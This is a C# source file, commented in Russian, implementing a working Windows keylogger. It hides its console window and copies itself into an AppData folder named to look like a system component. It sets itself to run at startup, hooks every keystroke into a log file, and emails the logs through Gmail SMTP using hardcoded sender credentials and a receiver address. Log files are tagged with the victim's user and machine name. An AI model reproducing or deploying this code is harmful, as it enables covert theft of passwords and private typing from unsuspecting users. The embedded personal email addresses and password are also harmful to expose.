﻿using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using System.Net.Mail;
using IWshRuntimeLibrary;
using System.Collections.Generic;

class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    // Адреса почты отправителя и получателя и пароль отправителя
    private const string senderEmail = "Sender122015@gmail.com";
    private const string receiverEmail = "masha_kochergina@mail.ru";
    private const string senderPassword = "password122015";

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    // 0 - скрыть, 1 - показать
    const int SW_HIDE = 0;

    static int numChar = 0;

    public static void Main()
    {
        var handle = GetConsoleWindow();

        // Скрыть?
        ShowWindow(handle, SW_HIDE);

        // Поддержка доступа (папка автозагрузки и %appdata%)
        init();

        // Старт перехвата клавиатуры
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);

    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            //Запись в консоль и в файл
            Console.WriteLine((Keys)vkCode);
            writeLetter((Keys)vkCode);

            //Отправка лога по электронной почте по достижению определённого веса
            FileInfo logFile = new FileInfo(appData + @"\SysWin32\log.txt");
            if (logFile.Exists && logFile.Length > 1000)
                   {
                        sendmail(System.IO.File.ReadAllText(logFile.ToString()), senderEmail, receiverEmail, senderPassword);
                    string filename = "log_" + Environment.UserName + "@" + Environment.MachineName + "_" + DateTime.Now.ToString(@"MM_dd_yyyy_hh\hmm\mss") + ".txt";
                    logFile.MoveTo(appData + @"\SysWin32\logs\" + filename);
                 }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    /// <summary>
    ///     Method used to copy the executable to user's appdata and make it launch at startup
    /// </summary>
    private static void init()
    {
        string myPath = Application.ExecutablePath;
        string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        string copyPath = appData + @"\SysWin32\" + Path.GetFileName(myPath);

        Directory.CreateDirectory(appData + @"\SysWin32\");
        Directory.CreateDirectory(appData + @"\SysWin32\logs\");

        if (!System.IO.File.Exists(copyPath))
        {
            System.IO.File.Copy(myPath, copyPath);
            CreateShortcut("SysWin32", startupPath, copyPath);
        }
    }

    /// <summary>
    ///     Method used to send logs via mail
    /// </summary>
    /// <param name="logs">The content of a log to send.</param>
    /// <param name="sender">Sender's email address</param>
    /// <param name="receiver">Receiver's email address</param>
    /// <param name="password">Password of the sender's email account</param>
    private static void sendmail(string logs, string sender, string receiver, string password)
    {
        // Assign variables
        var fromAddress = new MailAddress(sender, "From Sender");
        var toAddress = new MailAddress(receiver, "To Receiver");
        string fromPassword = password;
        string subject = "Subject";
        string body = logs;

        // Create an SMTP Client object and instantiate its properties 
        //var smtp = new SmtpClient();
       //     var smtp = new SmtpClient("smtp.mail.ru", 587);
               var smtp = new SmtpClient
               {
                   Host = "smtp.gmail.com",
                   //Host = "smtp.mail.ru",
                   Port = 587,
                   //Port = 465,
                   EnableSsl = true,
                   DeliveryMethod = SmtpDeliveryMethod.Network,
                   UseDefaultCredentials = false,
                   Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
               };      

        // Create the message to send
        var message = new MailMessage(fromAddress, toAddress)
        {
            Subject = subject,
            Body = body,
        };

        // Send the message
        smtp.Send(message);
    }

    /// <summary>
    ///     Method used to write the key received to the log file
    /// </summary>
    /// <param name="key">The key typed on the keyboard</param>
    /// This method should be activated for each and every keystrokes the user type.
    private static void writeLetter(Keys key)
    {
        // Start writing to a file
        StreamWriter sw = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\SysWin32\log.txt", true);

        // Create aliases for special characters to render properly in the logs
        var specialKeys = new Dictionary<string, string>()
        {
            {"Back", " *back* "},
            {"Return", "\n"},
            {"Space", " "},
            {"Add", "+"},
            {"Subtract", "-"},
            {"Divide", "/"},
            {"Multiply", "*"},
            {"Up", " *up* "},
            {"Down", " *down* "},
            {"Left", " *left* "},
            {"Capital", " *caps* "},
            {"Tab", " *tabs* "},
            {"LShiftKey", " ^ "},
            {"RShiftKey", " ^ "},
            {"Oemcomma", ","},
            {"OemPeriod", "."}
        };

        // Write the key (or its alias) to the file
        if (specialKeys.ContainsKey(key.ToString()))
        {
            sw.Write(specialKeys[key.ToString()]);
        }
        else
        {
            sw.Write(key.ToString().ToLower());
        }

        // Write a new line each 50 characters
        numChar += 1;
        if (numChar == 50)
        {
            sw.WriteLine("");
            numChar = 0;
        }

        // Close the connection to the file
        sw.Close();

    }

    /// <summary>
    ///     This method creates a shortcut
    /// </summary>
    /// <param name="shortcutName">The name of the shortcut</param>
    /// <param name="shortcutPath">The location of the shortcut</param>
    /// <param name="targetFileLocation">What should be linked</param>
    /// Require "using IWshRuntimeLibrary;", and a reference to Windows Script Host Model
    public static void CreateShortcut(string shortcutName, string shortcutPath, string targetFileLocation)
    {
        string shortcutLocation = System.IO.Path.Combine(shortcutPath, shortcutName + ".lnk");
        WshShell shell = new WshShell();
        IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutLocation);

        shortcut.Description = "Keys";
        shortcut.TargetPath = targetFileLocation;
        shortcut.Save();
    }
}